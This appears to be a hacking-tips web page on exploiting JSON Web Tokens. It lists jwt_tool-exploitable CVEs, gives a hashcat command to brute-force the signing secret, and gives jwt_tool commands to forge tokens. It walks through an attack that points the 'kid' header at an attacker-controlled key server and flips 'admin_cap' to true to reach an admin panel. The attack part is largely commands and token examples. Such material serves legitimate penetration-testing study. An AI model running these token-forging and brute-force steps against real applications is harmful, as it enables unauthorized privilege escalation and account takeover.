[back](/)

### JSON Web Tokens exploitation (JWT hack tricks)

What JSON Web Token (JWT) is? It is an open standard [RFC 7519](https://tools.ietf.org/html/rfc7519) for creating access tokens, in accordance with which information is transmitted in the form of a JSON object. JSON signature algorithms are used to secure the transmission of such information. For more information about JWT read: [jwt.io](https://jwt.io/introduction/).

The JWT is divided into three sections, separated by a dot: **HEADER.PAYLOAD.SIGNATURE**

To work with the JWT, [jwt_tool](https://github.com/ticarpi/jwt_tool) utility is best suited, which will allow exploiting the most popular vulnerabilities:

```
(CVE-2015-2951) The alg=none signature-bypass vulnerability
(CVE-2016-10555) The RS/HS256 public key mismatch vulnerability
(CVE-2018-0114) Key injection vulnerability
(CVE-2019-20933/CVE-2020-28637) Blank password vulnerability
(CVE-2020-28042) Null signature vulnerability
```

In case there are no vulnerabilities, you can try to guess or brute force the JWT encryption password and than change any key and values. For example, set the flag **"is_admin":"true"** or something similar. In order to generate the appropriate JWT, that will be suitable for the application, a encryption password is required.

To brute force a JWT encryption password, using a dictionary method:

```
hashcat -a 0 -m 16500 jwthash.txt wordlist.txt
```

![Image](/img/jwt/1.png)

For parse JWT you can use [jwt.io](https://jwt.io/) site or the [jwt_tool](https://github.com/ticarpi/jwt_tool) utility:

![Image](/img/jwt/2.png)

![Image](/img/jwt/2.5.png)

To generate JWT by [jwt_tool](https://github.com/ticarpi/jwt_tool) using HMAC-SHA signing:

```
python3 jwt_tool.py -b -S hs256 -p 'keypass' $(echo -n '{"typ":"JWT","alg":"HS256"}' | base64).$(echo -n '{"data": {"username": "jaki"}}' | base64 -w0).
```

In this case, it is represented an attack on the JWT, where the HEADER section uses reading the private key to decrypt the token. Imagine you have users JWT token after registering on the web application, and your goal is to elevate your rights

```
HEADER:
{
  "typ": "JWT",
  "alg": "RS256",
  "kid": "http://localhost:7070/privKey.key" --- change to attacker ip
}

PAYLOAD

{
  "username": "root",
  "email": "1@test.ru",
  "admin_cap": "false" --- change on true 
}
```

In this example, the attacker can try to replace the ip-address with his own, having previously created a pair of keys:

```
ssh-keygen -t rsa -b 4096 -m PEM -f privKey.key
```

Initially, access to the admin panel is closed due to the set flag in PAYLOAD: **"admin_cap":"false"**.

![Image](/img/jwt/3.png)

Сonsidering that the web application uses **RS56 RSA signing**, there are two ways to encrypt a JWT with the **"admin_cap":"true"** value and the modified **"kid"** HEADER value:

1. Using [jwt.io](https://jwt.io/) site
2. Or using [jwt_tool](https://github.com/ticarpi/jwt_tool) utility

```
python3 jwt_tool.py CURRENT_JWT -T -S rs256 -pr /tmp/keys/privKey.key
```

![Image](/img/jwt/4.png)

![Image](/img/jwt/4.5.png)

Before sending the JWT application, you need to start the http-server to access the private key:

![Image](/img/jwt/5.png)

The attacker successfully gained access to the admin panel:

![Image](/img/jwt/6.png)


<div id="disqus_thread"></div>
<script>
(function() { // DON'T EDIT BELOW THIS LINE
var d = document, s = d.createElement('script');
s.src = 'https://hackitfaster-hopto-org.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

[back](/)